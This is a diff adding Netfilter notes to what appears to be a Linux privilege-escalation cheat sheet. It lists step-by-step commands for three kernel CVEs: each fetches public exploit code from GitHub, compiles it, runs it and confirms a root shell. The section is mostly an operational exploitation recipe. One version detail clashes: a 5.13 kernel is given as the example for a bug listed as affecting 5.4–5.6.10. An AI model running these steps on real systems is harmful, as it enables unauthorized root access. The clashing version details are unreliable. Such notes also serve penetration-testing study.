@@ -2440,3 +2440,76 @@ find / -perm -4000 2>/dev/null
 ```
 
 ---
+
+# 🛡️ Netfilter Overview
+
+Netfilter is a Linux kernel module responsible for:
+
+- Packet filtering
+- Connection tracking
+- Network Address Translation (NAT)
+
+It acts as a software layer in the Linux kernel, intercepting and manipulating packets via tools like:
+
+- `iptables`
+- `arptables`
+
+When activated, Netfilter checks all IP packets before forwarding them to applications.
+
+
+# ⚠️ Netfilter Vulnerabilities & Exploits
+
+## 🔓 CVE-2021-22555
+- **Affected kernels:** 2.6 – 5.11
+- **Type:** Privilege escalation via memory corruption
+
+### ✅ Exploit Steps
+```bash
+uname -r
+# Confirm kernel version (e.g., 5.10.5-051005-generic)
+
+wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
+gcc -m32 -static exploit.c -o exploit
+./exploit
+
+id
+# Should return: uid=0(root) gid=0(root) groups=0(root)
+```
+
+## 🔓 CVE-2022-25636
+- **Affected kernels:** 5.4 – 5.6.10
+- **Location:** net/netfilter/nf_dup_netdev.c
+- **Type:** Heap out-of-bounds write
+- **Risk:** Kernel corruption; may require reboot
+
+### ✅ Exploit Steps
+```bash
+uname -r
+# Confirm kernel version (e.g., 5.13.0-051300-generic)
+
+git clone https://github.com/Bonfee/CVE-2022-25636.git
+cd CVE-2022-25636
+make
+./exploit
+
+id
+# Should return: uid=0(root) gid=0(root) groups=0(root)
+```
+
+
+## 🔓 CVE-2023-32233
+- **Affected kernels:** Up to 6.3.1
+- **Type:** Use-After-Free in nf_tables anonymous sets
+
+### ✅ Exploit Steps
+```bash
+git clone https://github.com/Liuk3r/CVE-2023-32233
+cd CVE-2023-32233
+gcc -Wall -o exploit exploit.c -lmnl -lnftnl
+./exploit
+
+id
+# Should return: uid=0(root) gid=0(root) groups=0(root)
+```
+
+---
